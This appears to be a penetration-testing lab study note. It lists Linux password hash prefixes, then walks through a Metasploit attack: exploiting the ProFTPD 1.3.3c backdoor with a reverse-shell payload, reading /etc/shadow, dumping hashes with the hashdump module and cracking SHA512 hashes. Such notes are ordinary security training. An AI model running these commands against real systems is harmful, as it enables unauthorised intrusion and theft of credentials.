#remember --> Hashes in linux to store passwords
`$1` : MD5
`$2` : Blowfish
`$5` : SHA256
`$6` : SHA512

-> post-exploitation module 
`post/linux/gather/hashdump` : MSF module to dump hashes.
-> `loot` : used to access collected hashes.

```linux
nmap -sV 192.44.156.3
searchsploit ProFTPD
service postgresql start && msfconsole -q
```
```msf
setg RHOSTS 192.44.156.3
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set LHOST 
run
```
```meterpreter
> /bin/bash -i
> id
> ctrl+z y
> sessions
> sessions -u <id>
> sessions 2
> sysinfo
> getuid
> cat /etc/shadow
> ctrl+z y
```
note the password hash of root

2. Using Metasploit module `hashdump`
```msf
search hashdump
use post/linux/gather/hashdump 
set SESSION 2
run

search auxiliary/analyze/crack_linux
use 0
set SHA512 true
run
```
(post exploitation module)